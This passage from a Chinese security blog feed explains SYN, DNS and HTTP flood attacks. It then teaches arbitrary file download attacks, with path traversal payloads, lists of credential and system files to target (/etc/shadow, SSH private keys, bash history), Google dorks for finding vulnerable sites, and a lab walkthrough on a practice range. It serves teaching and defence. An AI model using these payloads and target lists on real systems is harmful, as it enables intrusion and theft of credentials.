1，这时，TCP连接便建立好了，接下来便可以进行数据通信了。</li>\n</ol>\n<p><strong>TCP 协议</strong> 是可靠的传输协议，在三次握手的过程中设置了一些异常处理机制。第三步中如果服务器没有收到客户端的 <strong>ACK</strong> 报文，服务端一般会进行重试，也就是再次发送 <strong>SYN + ACK</strong> 报文给客户端，并且一直处于 <strong>SYN_RECV</strong> 的状态，将客户端加入等待列表；另一方面，服务器在发出 <strong>SYN + ACK</strong> 报文后，会预先分配一部分资源给即将建立的 <strong>TCP</strong> 连接，这个资源在等待重试期间一直保留，由于服务器的资源有限，可以维护的等待列表超过极限之后就不会再接收新的 <strong>SYN</strong> 报文，也就是拒绝建立新的 TCP 连接。</p>\n<p>这个时候我们便可以说说 <strong>SYN Flood</strong> 是怎么回事了，<strong>SYN Flood</strong>就是利用了 TCP 协议三次握手的过程来达到攻击的目的。攻击者伪造大量的 IP 地址给服务器发送 <strong>SYN</strong> 报文，因为伪造的 IP 地址不可能存在，也就不可能从客户端得到任何响应，就会一直卡在<strong>第三步</strong>，服务端就得维护一个非常大的半连接等待列表，并且不断对这个列表中的 IP 地址进行遍历重试，占用了大量的系统资源。而由于服务器资源有限，恶意的连接占满了服务器的等待队列，导致服务器不再接收新的 SYN 请求，使正常的用户无法完成通信。</p>\n<h5 id=\"2dns-query-flood\"><a class=\"markdownIt-Anchor\" href=\"#2dns-query-flood\"></a> 2）DNS Query Flood</h5>\n<p><strong>DNS Query Flood</strong> 实际上就是 <strong>UDP Flood</strong> 攻击的一种变形，因为 <strong>DNS</strong> 服务在互联网中具有不可替代的作用，因此一旦 <strong>DNS 服务器</strong> 瘫痪，影响将非常大！</p>\n<p><strong>DNS Query Flood</strong> 攻击采用的方法是向被攻击的服务器发送海量的域名解析请求。而这部分请求解析的域名一般都是随机生成的，大部分不存在，并且通过伪造端口和客户端IP，防止查询请求被 <strong>ACL</strong>（访问控制列表）过滤。被攻击的 <strong>DNS服务器</strong> 在收到域名解析的请求后，首先会在自己的服务器上查找是否该域名的 IP，因为域名的不存在，在自身自然是找不到的，因此<strong>DNS 服务器</strong>便会向上层的 DNS服务器递归查询域名，直到全球互联网的 13台 根DNS服务器。大量不存在的域名解析请求给服务器带来了很大的负载，当解析请求超过一定量级的时候，就会造成 <strong>DNS服务器</strong> 解析域名超时，使正常的域名都查询不到对应的 IP，达到了攻击的效果。</p>\n<h5 id=\"3cc-攻击\"><a class=\"markdownIt-Anchor\" href=\"#3cc-攻击\"></a> 3）CC 攻击</h5>\n<p><strong>CC</strong>（Challenge Collapsar）攻击是基于应用层 HTTP 协议发起的攻击，也称为 <strong>HTTP Flood</strong></p>\n<p><strong>CC攻击</strong>的原理是通过控制大量的 <strong>“肉鸡”</strong> 或者利用从互联网上搜寻的大量匿名的 HTTP 代理，模拟正常用户给网站发起请求直到该网站拒绝服务为止。大部分网站会通过 <strong>CDN</strong> 以及分布式缓存来加快服务端的响应，提高网站的吞吐量。而这些恶意的 HTTP 请求会有意的避开这些缓存，需要进行多次 DB 查询操作或者一次请求会返回大量的数据，加速系统资源的消耗，从而拖垮后端的业务处理系统。</p>\n<p>以上便是常见的 Web 攻击手段，知其然知其所以然，安全是极为重要也是极难防护的，每个开发人员都应该引起重视</p>\n",
            "tags": [
                "安全"
            ]
        },
        {
            "id": "http://example.com/2021/04/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/",
            "url": "http://example.com/2021/04/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/",
            "title": "任意文件下载",
            "date_published": "2021-04-18T10:39:27.000Z",
            "content_html": "<h2 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\"></a> 原理</h2>\n<p>产生：任意语言代码下载函数<br />\n文件下载（一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。）</p>\n<blockquote>\n<p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如…/…/…/etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。<br />\n所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。</p>\n</blockquote>\n<h2 id=\"漏洞危害\"><a class=\"markdownIt-Anchor\" href=\"#漏洞危害\"></a> 漏洞危害</h2>\n<p>下载服务器任意文件，如脚本代码、服务及系统配置文件等<br />\n可用得到的代码进一步代码审计，得到更多可利用漏洞</p>\n<h2 id=\"利用方式\"><a class=\"markdownIt-Anchor\" href=\"#利用方式\"></a> 利用方式</h2>\n<p><a href=\"https://www.cnblogs.com/dongchi/p/5561039.html\">浅谈任意文件下载漏洞的利用</a><br />\n信息收集信息→猜路径→下载配置文件/代码文件→利用服务器软件漏洞→shell→提权</p>\n<p>首先收集系统信息，包括系统版本，中间件，cms版本，服务器用途，服务器使用者信息，端口，web路径等，然后根据收集到的信息，下载配置文件，如weblogic，ftp，ssh等， 根据下载到的配置文件进行渗透。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 读取程序源代码（如密码配置文件）</span><br><span class=\"line\">2. 读取程序配置文件（如数据库连接文件）</span><br><span class=\"line\">&gt; 如weblogic，ssh，ftp，数据库配置文件等， 当解出密码后，进行登陆，getshell</span><br><span class=\"line\">3. 读取操作系统关键文件（如/etc/sadow，/ root/.bash_history等文件）</span><br><span class=\"line\">4. 读取运维配置文件（redis/rsync/ftp/ssh客 户端数据等）</span><br><span class=\"line\">5. 读取中间件配置文件（weblogic/tomcat等 密码文件，apache的httpd.conf文件）</span><br><span class=\"line\">6. 下载web日志文件（获取网站后台/上传文件 等）</span><br><span class=\"line\">&gt;  下载日志文件，找到登录/上传/后台/ 操作，找到登录入口 可以爆破，测试默认口令，弱口令， 找到文件上传点则测试文件上传漏洞，找到后台操作试试有没有未授权访问</span><br><span class=\"line\">7. 结合SSRF获取内网机器文件</span><br><span class=\"line\">8. 可以利用../返回到上级目录下载敏感文件</span><br></pre></td></tr></table></figure>\n<h2 id=\"系统文件\"><a class=\"markdownIt-Anchor\" href=\"#系统文件\"></a> 系统文件</h2>\n<h3 id=\"window\"><a class=\"markdownIt-Anchor\" href=\"#window\"></a> window</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; C:\\boot.ini //查看系统版本</span><br><span class=\"line\">&gt; C:\\Windows\\System32\\inetsrv\\MetaBase. xml //IIS配置文件</span><br><span class=\"line\">&gt; C:\\Windows\\repair\\sam //存储系统初次安装的密码</span><br><span class=\"line\">&gt; C:\\Program Files\\mysql\\my.ini //Mysql配置</span><br><span class=\"line\">&gt; C:\\Program Files\\mysql\\data\\mysql\\user. MYD //Mysql root</span><br><span class=\"line\">&gt; C:\\Windows\\php.ini //php配置信息</span><br><span class=\"line\">&gt; C:\\Windows\\my.ini //Mysql配置信息</span><br></pre></td></tr></table></figure>\n<h3 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\"></a> Linux</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; .bash_history` # 历史中可能带着用户的密码 ( 遇到过现实案例,是输错的情况下参数的,比如没 输入 su 却以为自己输了 su)</span><br><span class=\"line\">&gt; /etc/passwd # 用户情况</span><br><span class=\"line\">&gt; /etc/shadow # 直接 John the Ripper</span><br><span class=\"line\">&gt; /etc/hosts # 主机信息，通常配置了一些内网 域名</span><br><span class=\"line\">&gt; /root/.bash_history //root的bash历史记录</span><br><span class=\"line\">&gt; /root/.ssh/authorized_keys /root/.mysql_history //mysql的bash历史记录</span><br><span class=\"line\">&gt; /root/.wget-hsts /opt/nginx/conf/nginx.conf //nginx的配置文件</span><br><span class=\"line\">&gt; /var/www/html/index.html /etc/my.cnf /etc/httpd/conf/httpd.conf //httpd的配置文件</span><br><span class=\"line\">&gt; /proc/self/fd/fd[0-9]*(文件标识符)</span><br><span class=\"line\">&gt; /proc/mounts /porc/config.gz /proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用</span><br><span class=\"line\">&gt; /proc/mounts // 挂载的文件系统列表</span><br><span class=\"line\">&gt; /proc/net/arp //arp表，可以获得内网其他机器的地址</span><br><span class=\"line\">&gt; /proc/net/route //路由表信息</span><br><span class=\"line\">&gt; /proc/net/tcp and /proc/net/udp // 活动连接的信息</span><br><span class=\"line\">&gt; /proc/net/fib_trie // 路由缓存</span><br><span class=\"line\">&gt; /proc/version // 内核版本</span><br><span class=\"line\">&gt; /proc/[PID]/cmdline // 可能包含有用的路径信息</span><br><span class=\"line\">&gt; /proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含getshell</span><br><span class=\"line\">&gt; /proc/[PID]/cwd // 当前进程的工作目录</span><br><span class=\"line\">&gt; /proc/[PID]/fd/[#] // 访问file descriptors， 某写情况可以读取到进程正在使用的文件，比如 access.log /root/.ssh/id_rsa /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys /etc/ssh/sshd_config /var/log/secure /etc/sysconfig/network-scripts/ifcfg-eth0 /etc/syscomfig/network-scripts/ifcfg-eth1</span><br><span class=\"line\">&gt; /usr/local/tomcat/conf/tomcat-users. xml # tomcat 用户配置文件</span><br><span class=\"line\">&gt; /root/.bashrc # 环境变量</span><br><span class=\"line\">&gt; /root/.bash_history # 还有root外的其他用户</span><br><span class=\"line\">&gt; /root/.viminfo # vim 信息</span><br><span class=\"line\">&gt; /root/.ssh/id_rsa # 拿私钥直接ssh</span><br><span class=\"line\">&gt; /proc/xxxx/cmdline # 进程状态枚举 xxxx 可以为0000-9999 使用burpsuite 数据库 config 文件   web 日志 access.log, error.log /var/lib/php/sess_PHPSESSID # 非常规问题 session 文件</span><br><span class=\"line\">&gt; /proc/net/arp /proc/net/tcp /proc/net/udp /proc/net/dev</span><br></pre></td></tr></table></figure>\n<h2 id=\"常见脚本敏感文件参考\"><a class=\"markdownIt-Anchor\" href=\"#常见脚本敏感文件参考\"></a> 常见脚本敏感文件参考</h2>\n<p>PHP： inc/config. php获得数据库连接字符串中的口令信息<br />\nasp： inc/conn.asp文件，获得数据库连接字符串，得到数据库口令。<br />\naspx： web.config网站根目录文件，获得数据库连接信息。<br />\nJSP： conf/ tomcat-user.xml文件，获得tomcat管理界面的口令信息<br />\nWEB- INF /Web. xml文件,获得数据库连接字符串中的口令信息。</p>\n<h2 id=\"任意文件读取\"><a class=\"markdownIt-Anchor\" href=\"#任意文件读取\"></a> 任意文件读取</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$filename</span> = <span class=\"string\">&quot;test.txt&quot;</span>;</span><br><span class=\"line\">readfile(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$filename</span> = <span class=\"string\">&quot;test.txt&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$fp</span> = fopen(<span class=\"variable\">$filename</span>,<span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Unable to open file!&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$data</span> = fread(<span class=\"variable\">$fp</span>,filesize(<span class=\"variable\">$filename</span>));</span><br><span class=\"line\">fclose(<span class=\"variable\">$fp</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$data</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$filename</span> = <span class=\"string\">&quot;test.txt&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> file_get_contents(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"任意文件下载\"><a class=\"markdownIt-Anchor\" href=\"#任意文件下载\"></a> 任意文件下载</h2>\n<p>直接下载：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;http://www.xx.com/a.zip&quot;</span> <span class=\"attr\">rel</span>=<span class=\"string\">&quot;external nofollow&quot;</span> &gt;</span>Download<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>用header()下载：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$filename</span> = <span class=\"string\">&quot;uploads/201607141437284653.jpg&quot;</span>;</span><br><span class=\"line\">header(<span class=\"string\">&#x27;Content-Type: imgage/jpeg&#x27;</span>);</span><br><span class=\"line\">header(<span class=\"string\">&#x27;Content-Disposition: attachment; filename=&#x27;</span>.<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">header(<span class=\"string\">&#x27;Content-Lengh: &#x27;</span>.filesize(<span class=\"variable\">$filename</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"google-search\"><a class=\"markdownIt-Anchor\" href=\"#google-search\"></a> Google search</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">inurl:&quot;readfile.php?file=&quot;</span><br><span class=\"line\">inurl:&quot;read.php?filename=&quot;</span><br><span class=\"line\">inurl:&quot;download.php?file=&quot;</span><br><span class=\"line\">inurl:&quot;down.php?file=&quot;</span><br><span class=\"line\">等等...</span><br></pre></td></tr></table></figure>\n<h2 id=\"漏洞利用代码\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用代码\"></a> 漏洞利用代码</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">readfile.php?file=/etc/passwd``readfile.php?file=../../../../../../../../etc/passwd``readfile.php?file=../../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>\n<p>1.文件被解析，则是文件包含漏洞<br />\n2.显示源代码，则是文件读取漏洞<br />\n3.提示文件下载，则是文件下载漏洞</p>\n<h2 id=\"漏洞挖掘\"><a class=\"markdownIt-Anchor\" href=\"#漏洞挖掘\"></a> 漏洞挖掘</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可以用Google hacking或Web漏洞扫描器``从链接上看，形如：</span><br><span class=\"line\">• readfile.php?file=***.txt</span><br><span class=\"line\">• download.php?file=***.rar</span><br><span class=\"line\">从参数名看，形如：</span><br><span class=\"line\">• &amp;RealPath= </span><br><span class=\"line\">• &amp;FilePath= </span><br><span class=\"line\">• &amp;ﬁlepath= </span><br><span class=\"line\">• &amp;Path= </span><br><span class=\"line\">• &amp;path= </span><br><span class=\"line\">• &amp;inputFile=</span><br><span class=\"line\">• &amp;url= </span><br><span class=\"line\">• &amp;urls= </span><br><span class=\"line\">• &amp;Lang= </span><br><span class=\"line\">• &amp;dis= </span><br><span class=\"line\">• &amp;data= </span><br><span class=\"line\">• &amp;readﬁle= </span><br><span class=\"line\">• &amp;ﬁlep= </span><br><span class=\"line\">• &amp;src= </span><br><span class=\"line\">• &amp;menu= </span><br><span class=\"line\">• META-INF </span><br><span class=\"line\">• WEB-INF</span><br><span class=\"line\">目录符号等</span><br><span class=\"line\">../ ..\\ .\\ ./等</span><br><span class=\"line\">%00 ? %23 %20 .等</span><br></pre></td></tr></table></figure>\n<h2 id=\"漏洞验证\"><a class=\"markdownIt-Anchor\" href=\"#漏洞验证\"></a> 漏洞验证</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">• index.php?f=../../../../../../etc/passwd </span><br><span class=\"line\">• index.php?f=../index.php </span><br><span class=\"line\">• index.php?f=ﬁle:///etc/passwd</span><br><span class=\"line\">注：当参数f的参数值为php文件时，若是文件被解析则是文件包含漏洞，</span><br><span class=\"line\">若显示源码或提示下载则是文件查看与下载漏洞</span><br></pre></td></tr></table></figure>\n<h2 id=\"漏洞防范\"><a class=\"markdownIt-Anchor\" href=\"#漏洞防范\"></a> 漏洞防范</h2>\n<p><a href=\"https://tonydeng.github.io/2016/06/13/simple-protection-measures-to-download-any-file/\">任意文件下载漏洞的简单防护措施</a><br />\n1、过滤“.”符号，使用户在url中无法回溯到上级目录。<br />\n2、使用正则表达式严格判断用户输入参数的格式。<br />\n3、php.ini配置文件中对于open_basedir进行配置，限定用户的文件访问范围。<br />\n4、固定目录</p>\n<h2 id=\"案例\"><a class=\"markdownIt-Anchor\" href=\"#案例\"></a> 案例</h2>\n<h3 id=\"pikuchu靶场-文件下载测试\"><a class=\"markdownIt-Anchor\" href=\"#pikuchu靶场-文件下载测试\"></a> pikuchu靶场-文件下载测试</h3>\n<p>1、判断是否为文件上传漏洞</p>\n<p><img src=\"2021082316105330.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105330.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>点击任意图片，发现下载了图片，复制图片下载链接查看</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png\">http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png</a></p>\n</blockquote>\n<p>查看参数名为filename，查看参数后面的值也与下载的文件名一样<br />\n初步判定为文件上传漏洞</p>\n<p>2、判断下载路径<br />\nfilename的文件名是单纯的文件名，可判断是前面加了路径名，也可能是与网站在同一个目录下<br />\n通过URL判断文件是通过跳转到execdownload.php页面下载的，我们试试看可不可以直接下载到execdownload.php这个源码</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=execdownload.php\">http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=execdownload.php</a></p>\n</blockquote>\n<p><img src=\"2021082316105331.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105331.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>发现显示无法下载，说明该execdownload.php与文件不在同一个路径下，我们尝试下到上一级路径</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=../execdownload.php\">http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=../execdownload.php</a></p>\n</blockquote>\n<p><img src=\"2021082316105332.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105332.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>成功下载，打开源码发现是在download文件夹下</p>\n<p><img src=\"2021082316105333.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105333.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>说明文件下载路径的文件夹与down_nba.php是同一级路径<br />\n3、尝试下载敏感文件（以下路径均通过扫描路径得到）<br />\npikachu-master/inc/config.inc.php<br />\n当前下载路径：<br />\npikachu-master/vul/unsafedownload/download/xxx.xxx<br />\n与vul相差3个父目录，所以加3个…/<br />\n完整url：<br />\n<a href=\"http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=%E2%80%A6/%E2%80%A6/%E2%80%A6/inc/config.inc.php\">http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=…/…/…/inc/config.inc.php</a><br />\n下载成功，打开发现里面存在数据库相关的配置文件</p>\n<p><img src=\"2021082316105334.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105334.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<h3 id=\"小米路由器-文件读取真实测试-漏洞\"><a class=\"markdownIt-Anchor\" href=\"#小米路由器-文件读取真实测试-漏洞\"></a> 小米路由器-文件读取真实测试-漏洞</h3>\n<p><a href=\"https://www.seebug.org/vuldb/ssvid-98122\">复现</a></p>\n<h3 id=\"roarctf2019-文件读取真题复现\"><a class=\"markdownIt-Anchor\" href=\"#roarctf2019-文件读取真题复现\"></a> RoarCTF2019-文件读取真题复现</h3>\n<p><a href=\"https://blog.csdn.net/ChenZIDu/article/details/103533554\">wp</a><br />\n首先看到一个页面,点击下help看看啥情况。<br />\n<img src=\"2021082316105335.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105335.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>发现输出一串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure>\n<p>是文件无法找到的异常信息</p>\n<p><img src=\"2021082316105336.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105336.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>查询资料发现：<br />\nWEB-INF/web.xml泄露<br />\nWEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：<br />\n/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br />\n/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br />\n/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br />\n/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br />\n/WEB-INF/database.properties：数据库配置文件</p>\n<blockquote>\n<p>漏洞成因：<br />\n通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>\n</blockquote>\n<p>根据上文，我们先找一下WEB-INF/web.xml,POST传值</p>\n<p><img src=\"2021082316105437.png\" class=\"lazyload placeholder\" data-srcset=\"2021082316105437.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"在这里插入图片描述\" /></p>\n<p>得到WEB-INF/web.xml文件，打开</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class=\"line\">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class=\"line\">         version=&quot;4.0&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;welcome-file-list&gt;</span><br><span class=\"line\">        &lt;welcome-file&gt;Index&lt;/welcome-file&gt;</span><br><span class=\"line\">    &lt;/welcome-file-list&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet&gt;</span><br><span 